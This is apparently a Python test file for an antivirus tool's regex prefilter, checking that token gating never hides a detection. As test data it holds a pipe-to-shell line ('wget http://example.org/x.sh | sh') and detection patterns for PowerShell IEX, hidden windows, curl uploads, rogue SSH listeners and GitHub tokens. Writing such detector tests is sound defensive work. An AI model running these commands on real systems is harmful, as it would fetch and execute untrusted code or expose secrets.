"""Prefilter soundness tests (v3.2).

The prefilter gates regexes by the literal runs they must contain, so a wrong
token list silently *deletes* detections - the worst possible failure for an
antivirus.  These tests build a witness string for every pattern in the
library (walking the parsed pattern, one combination per alternation branch)
and fail if a witness matches the regex but the gate would skip the buffer.
"""
from __future__ import annotations

import re
import unittest

from antivirus import indicators, prefilter
from antivirus.prefilter import sample_strings as witnesses

class PatternRunsTests(unittest.TestCase):
    """The extractor has to be structure-aware, not just character-aware."""

    def test_alternation_branch_without_a_token_disables_the_gate(self):
        pattern = r"gh[psouhr]_[A-Za-z0-9]{20,}|github_pat_[A-Za-z0-9_]{20,}"
        # the first branch guarantees nothing, so nothing may be gated out
        self.assertEqual(prefilter.pattern_runs(pattern), [])
        token = "ghp_AAAABBBBCCCCDDDDEEEEFFFF01"
        self.assertTrue(re.search(pattern, token))
        gate = prefilter.build([("k", [pattern], True)])
        self.assertIn("k", gate.candidates(token.encode()))

    def test_tokens_are_required_by_every_match(self):
        # only the required part of a pattern may become a token: the branch
        # "w" of this alternation does not contain "windowstyle"
        self.assertEqual(prefilter.pattern_runs(r"-(?:w|windowstyle)\s+hidden"),
                         ["hidden"])
        self.assertEqual(prefilter.pattern_runs(r"(?:curl|wget)\s+-O"),
                         ["curl", "wget"])
        # an optional group cannot be relied on
        self.assertEqual(prefilter.pattern_runs(r"(?:aaa)?bbb"), ["bbb"])
        # any returned token must appear in every match
        for pattern in (r"mqtts?://host\.example", r"curl\s+-T\s+\S+",
                        r"(?:sshd|dropbear)\s+-p\s*\d+"):
            tokens = prefilter.pattern_runs(pattern)
            self.assertTrue(tokens, pattern)
            for witness in witnesses(pattern):
                self.assertTrue(any(t in witness.lower() for t in tokens),
                                (pattern, tokens, witness))

    def test_optional_digest_style_pattern_keeps_its_marker(self):
        self.assertEqual(prefilter.pattern_runs(r"IEX\s*\("), ["iex"])

    def test_requirement_is_a_disjunction_not_a_conjunction(self):
        tokens = prefilter.pattern_runs(r"(?:sshd|dropbear)\s+-p")
        self.assertEqual(sorted(tokens), ["dropbear", "sshd"])
        gate = prefilter.build([("k", [r"(?:sshd|dropbear)\s+-p"], True)])
        self.assertIn("k", gate.candidates(b"dropbear -p 2222"))


class LibraryGateSoundnessTests(unittest.TestCase):
    """No shipped check may be gated out of a buffer it would match."""

    def test_every_check_survives_its_own_witness(self):
        failures = []
        checked = 0
        for check in indicators.CHECKS:
            for pattern in check.patterns or ():
                runs = prefilter.pattern_runs(pattern)
                if not runs:                   # ungated: always tested
                    continue
                for witness in witnesses(pattern):
                    checked += 1
                    if any(token in witness.lower() for token in runs):
                        continue
                    failures.append((check.id, pattern, witness))
        self.assertGreater(checked, 20, "witness generation produced too little")
        self.assertEqual(failures, [], f"patterns whose gate can hide a match: "
                                      f"{failures[:5]}")

    def test_gate_survives_real_tokens(self):
        """End-to-end: a buffer holding a short-literal token is still seen."""
        checks = [c for c in indicators.CHECKS
                  if c.id in ("IND-EXEC-PS-IEX", "IND-EXEC-PIPE-TO-SHELL")]
        self.assertTrue(checks)
        buffer = b"wget http://example.org/x.sh | sh"
        flagged = {c.id for c in checks
                   if any(re.search(p, buffer.decode(), re.IGNORECASE)
                          for p in c.patterns or ())}
        self.assertIn("IND-EXEC-PIPE-TO-SHELL", flagged)
        candidates = set(indicators._PREFILTER.candidates(buffer))
        self.assertLessEqual(flagged, candidates)


if __name__ == "__main__":
    unittest.main()
